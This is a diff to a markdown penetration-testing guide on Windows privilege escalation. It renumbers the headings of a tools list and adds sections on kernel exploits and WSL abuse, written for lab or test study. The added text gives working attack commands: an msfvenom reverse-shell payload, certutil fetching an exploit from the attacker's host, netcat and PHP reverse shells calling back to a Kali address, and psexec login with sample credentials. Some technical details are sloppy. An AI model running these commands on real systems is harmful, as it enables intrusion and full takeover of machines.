@@ -245,7 +245,7 @@ These commands help determine what security software is in place, allowing you t
 
 Automated tools streamline the process of finding vulnerabilities and escalation paths on a Windows system. Below are some popular tools used for privilege escalation.
 
-### 1. **WinPEAS**
+### **WinPEAS**
 
 WinPEAS is part of the PEAS (Privilege Escalation Awesome Scripts) suite. It is a script designed to automate the process of finding potential privilege escalation vectors on Windows systems.
 
@@ -264,7 +264,7 @@ WinPEAS is part of the PEAS (Privilege Escalation Awesome Scripts) suite. It is 
 
 ---
 
-### 2. **Windows PrivEsc Checklist**
+### **Windows PrivEsc Checklist**
 
 This is a checklist that guides you through manual and automated steps to escalate privileges on a Windows system.
 
@@ -276,7 +276,7 @@ This is a checklist that guides you through manual and automated steps to escala
 
 ---
 
-### 3. **Sherlock**
+###  **Sherlock**
 
 Sherlock is a PowerShell script that scans for known vulnerabilities in the Windows operating system that can be exploited for privilege escalation.
 
@@ -296,7 +296,7 @@ Sherlock is a PowerShell script that scans for known vulnerabilities in the Wind
 
 ---
 
-### 4. **Watson**
+### **Watson**
 
 Watson is a vulnerability scanner that helps identify vulnerabilities based on the system's patch level. It’s used to identify missing patches or configurations that could lead to privilege escalation.
 
@@ -314,7 +314,7 @@ Watson is a vulnerability scanner that helps identify vulnerabilities based on t
 
 ---
 
-### 5. **PowerUp**
+###  **PowerUp**
 
 PowerUp is part of PowerSploit, a collection of PowerShell scripts that can be used for post-exploitation. PowerUp specifically looks for privilege escalation opportunities on Windows systems.
 
@@ -334,7 +334,7 @@ PowerUp is part of PowerSploit, a collection of PowerShell scripts that can be u
 
 ---
 
-### 6. **JAWS (Just Another Windows Script)**
+###  **JAWS (Just Another Windows Script)**
 
 JAWS is a PowerShell script used for post-exploitation and enumeration. It focuses on gathering information about the system, its users, and potential privilege escalation paths.
 
@@ -353,7 +353,7 @@ JAWS is a PowerShell script used for post-exploitation and enumeration. It focus
 
 ---
 
-### 7. **Windows Exploit Suggester**
+###  **Windows Exploit Suggester**
 
 This tool compares the patch level of the target system against the latest security bulletins from Microsoft to suggest potential privilege escalation vulnerabilities.
 
@@ -377,7 +377,7 @@ This tool compares the patch level of the target system against the latest secur
 
 ---
 
-### 8. **Metasploit Local Exploit Suggester**
+###  **Metasploit Local Exploit Suggester**
 
 Metasploit has a built-in module that suggests local exploits for privilege escalation based on the target system's configuration.
 
@@ -398,7 +398,7 @@ Metasploit has a built-in module that suggests local exploits for privilege esca
 
 ---
 
-### 9. **Seatbelt**
+### **Seatbelt**
 
 Seatbelt is a C# project that performs various security-related checks for common misconfigurations that could lead to privilege escalation.
 
@@ -416,7 +416,7 @@ Seatbelt is a C# project that performs various security-related checks for commo
 
 ---
 
-### 10. **SharpUp**
+###  **SharpUp**
 
 SharpUp is another C# tool designed to find privilege escalation vectors. It is part of the GhostPack suite and focuses on misconfigurations and exploitable services.
 
@@ -490,3 +490,302 @@ run post/multi/recon/local_exploit_suggester
     pip install xlrd --upgrade
     ./windows-exploit-suggester.py --database <db.xls> --systeminfo <sysinfo.txt>
     ```
+
+    # Escalation Path: Kernel Exploits
+
+Kernel exploits are a powerful technique in privilege escalation. They target vulnerabilities in the core of the operating system (the kernel), which controls interactions between hardware and software components. Successfully exploiting a kernel vulnerability can grant SYSTEM-level privileges, allowing you to fully control the target machine.
+
+### **What is a Kernel?**
+
+- The kernel is the core part of the operating system that manages system resources and allows hardware and software to communicate.
+- It acts as a **translator** between applications and the physical hardware, ensuring that resources are used effectively.
+
+### **Kernel Exploit Repositories:**
+
+A great source for finding kernel exploits is the Windows Kernel Exploits repository on GitHub. This repository contains various kernel vulnerabilities that can be exploited for privilege escalation.
+
+**Link:** [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
+
+---
+
+## Exploiting Kernel Vulnerabilities with Metasploit
+
+### **Steps for Kernel Exploits in Metasploit:**
+
+1. **Run Enumeration Tools:**
+First, you need to gather information about the system using tools like WinPEAS, PowerUp, or Metasploit's local exploit suggester. These tools help you identify which kernel vulnerabilities are applicable to the target system.
+    - Example tools:
+        - `winpeas.exe`
+        - `powerup.ps1`
+        - `local_exploit_suggester` in Metasploit
+2. **Check the Kernel Vulnerabilities:**
+Once you identify a potential kernel exploit, you can use Metasploit to search for a matching exploit.
+    - **Example Metasploit Kernel Exploit:**
+        
+        ```
+        use exploit/windows/local/ms10_015_kitrap0d
+        set session <session_id>
+        set lhost <your_ip>
+        set lport <your_port>
+        exploit
+        ```
+        
+3. **Background the Session:**
+After getting a session, background it to execute the kernel exploit.
+    
+    ```
+    background
+    ```
+    
+
+### **Metasploit Example: MS10-015 (Kitrap0d)**
+
+- This is a known kernel vulnerability affecting Windows, and it can be exploited using the `ms10_015_kitrap0d` exploit in Metasploit.
+- After setting the necessary options (`session`, `lhost`, `lport`), running the exploit should give you SYSTEM-level access.
+
+---
+
+## Manual Kernel Exploitation
+
+Sometimes you may need to exploit a kernel vulnerability manually, especially when a pre-built exploit is not available in Metasploit. Below is an example of how to exploit a kernel vulnerability manually.
+
+### **Steps for Manual Kernel Exploitation:**
+
+1. **Generate a Payload using msfvenom:**
+First, generate a reverse shell payload that will give you access to the system when the exploit is triggered.
+    
+    ```
+    msfvenom -p windows/shell_reverse_tcp lhost=<your_ip> lport=<your_port> -f aspx > shell.aspx
+    ```
+    
+2. **Start a Netcat Listener:**
+On your attacking machine, set up a Netcat listener to capture the reverse shell when the exploit runs.
+    
+    ```
+      nc -lvnp <your_port>
+    ```
+    
+3. **Transfer the Exploit to the Target:**
+    - On your Kali machine, use `python3` to set up a simple HTTP server:
+        
+        ```
+        python3 -m http.server 80
+        ```
+        
+    - On the target Windows machine, use `certutil` to download the exploit:
+        
+        ```
+        certutil -urlcache -f http://<your_ip>/<exploit_file> <output_name>
+        ```
+        
+4. **Run the Exploit on the Target:**
+After downloading the exploit, execute it on the target machine with the following command:
+    
+    ```
+    exploit.exe <your_ip> <your_port>
+    ```
+    
+5. **Get the Reverse Shell:**
+On your Kali machine, with the Netcat listener active, you should receive a reverse shell as `SYSTEM`, providing you with full control over the target.
+
+---
+
+### **Example: MS10-059 Kernel Exploit**
+
+Let’s walk through exploiting a specific kernel vulnerability, **MS10-059**:
+
+1. **Prepare the Exploit on Kali:**
+Set up a Python HTTP server to serve the exploit:
+    
+    ```
+    python3 -m http.server 80
+    ```
+    
+2. **Download the Exploit on Windows:**
+Use `certutil` to download the exploit onto the target machine:
+    
+    ```
+    certutil -urlcache -f http://<your_ip>/ms10-059.exe ms10-059.exe
+    ```
+    
+3. **Execute the Exploit:**
+Run the downloaded exploit:
+    
+    ```
+    ms10-059.exe <your_ip> <your_port>
+    ```
+    
+4. **Capture the Shell:**
+On Kali, use Netcat to catch the reverse shell:
+    
+    ```
+    nc -lvnp <your_port>
+    ```
+    
+
+If successful, this will give you `SYSTEM` privileges.
+
+---
+
+## Conclusion
+
+Exploiting kernel vulnerabilities can be one of the most powerful ways to escalate privileges in a Windows environment. By running tools like WinPEAS or PowerUp, you can gather critical information about the system and identify which kernel exploits are applicable. Whether you use automated tools like Metasploit or go the manual route with tools like msfvenom, kernel exploits can provide complete control over a compromised system.
+
+### **Additional Kernel Exploit Resources:**
+
+- [MS10-059 Kernel Exploit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)
+
+By understanding and executing these techniques, you can successfully escalate privileges and achieve root-level access on vulnerable Windows machines.
+
+# Escalation Path: Windows Subsystem for Linux (WSL)
+
+Windows Subsystem for Linux (WSL) allows running a Linux environment directly on Windows without needing a virtual machine or dual boot. Misconfigurations in WSL can be exploited to escalate privileges, enabling an attacker to gain **root access** or misuse WSL to run commands with elevated privileges.
+
+### **Concept Overview**
+
+- WSL bridges the gap between Linux and Windows. If an attacker can execute commands in WSL, they can use Linux commands to escalate privileges on the Windows system.
+- Misusing **WSL** can lead to privilege escalation, especially if WSL is configured to allow root access or execute privileged operations.
+- **Root privileges in WSL** allow the attacker to perform tasks like creating reverse shells, reading system files, or modifying system settings.
+
+---
+
+### Step-by-Step: Privilege Escalation Using WSL
+
+### 1. **Identify WSL on the Target Machine**
+
+First, determine if WSL is installed and locate the path to `bash.exe` and `wsl.exe`. These binaries are necessary to interact with the WSL environment.
+
+### **Example Command:**
+
+```bash
+where /R c:\windows bash.exe
+where /R c:\windows wsl.exe
+```
+
+This command will search for the WSL binaries on the Windows machine. If found, it confirms that WSL is installed and can be exploited.
+
+### **Example Output:**
+
+```bash
+C:\Windows\System32\bash.exe
+C:\Windows\System32\wsl.exe
+```
+
+### 2. **Check for Root Access in WSL**
+
+If WSL is installed, check if the WSL environment grants **root** access. WSL can be configured to start with root by default, or you can change the default user to `root` if you have access.
+
+### **Command to Change Default User to Root:**
+
+```bash
+wsl.exe --set-default-user root
+```
+
+This command sets `root` as the default user in WSL. By running this, you can now open a WSL shell with root privileges without needing the root password.
+
+### **Example Attack Scenario:**
+
+After changing the default user to `root`, the attacker can run any Linux commands with root privileges inside WSL.
+
+```bash
+wsl
+# Once inside WSL as root:
+whoami
+# Output: root
+```
+
+### 3. **Run Linux Commands for Privilege Escalation**
+
+Now that you have root access in WSL, you can execute Linux commands to interact with the Windows system.
+
+### **Example: Creating a Reverse Shell**
+
+Create a reverse shell from the target system to your attack machine using Netcat:
+
+1. **On your attacker machine (Kali Linux), start a Netcat listener:**
+    
+    ```bash
+    nc -lvnp 4444
+    ```
+    
+2. **On the target system (via WSL root access), run the following command:**
+    
+    ```bash
+    wsl
+    nc -e /bin/bash <kali_ip> 4444
+    ```
+    
+    This command opens a reverse shell from the target machine back to your Kali machine. You can now control the system remotely through the shell.
+    
+
+### **Example Output:**
+
+On your attacker machine, you should now have a root shell from the target system:
+
+```bash
+Connection received on <target_ip>:4444
+whoami
+root
+```
+
+---
+
+### Advanced Techniques: Using **Impacket** Tools for Privilege Escalation
+
+The **Impacket** toolkit includes various scripts for exploiting Windows protocols, such as SMB. If you have valid credentials on the system, you can use tools like **psexec.py** to execute commands remotely.
+
+### **Example Command:**
+
+```bash
+psexec.py user:password@target_ip
+```
+
+This command connects to the target machine over SMB and executes a command with the provided credentials. Once successful, you can gain administrative access.
+
+### **Example Scenario:**
+
+```bash
+psexec.py admin:P@ssword123@192.168.1.100
+```
+
+This will open an interactive shell as `admin` on the target machine if the credentials are correct.
+
+---
+
+### Alternative Path: Reverse Shell Using PHP
+
+If you can upload files to the system (e.g., through a vulnerable web server), you can create a **reverse shell** using PHP.
+
+### **Example PHP Reverse Shell:**
+
+Create a PHP file (`shell.php`) with the following content:
+
+```php
+<?php
+system('nc.exe -e cmd.exe <kali_ip> 4444');
+?>
+```
+
+1. Upload this file to the target system.
+2. On your attacker machine, set up a Netcat listener:
+    
+    ```bash
+    nc -lvnp 4444
+    ```
+    
+3. Navigate to the PHP file on the target system (e.g., `http://target.com/shell.php`). This will execute the reverse shell and give you a command line interface on the target machine.
+
+---
+
+### Final Thoughts
+
+Windows Subsystem for Linux (WSL) is a powerful feature in Windows environments, but it can also be misused for privilege escalation if misconfigured. By abusing WSL's root capabilities or misconfigured access, an attacker can leverage Linux commands and tools to control the underlying Windows system.
+
+**Key Techniques to Remember:**
+
+- Change the default WSL user to `root` to bypass authentication.
+- Use Linux commands inside WSL to escalate privileges or create shells.
+- Tools like **Impacket** and **Netcat** can assist in exploiting the system remotely.
+- WSL persistence can be used to maintain continuous access to a compromised system.
+
+By combining these techniques, attackers can effectively escalate privileges and gain control over a compromised Windows environment using WSL.
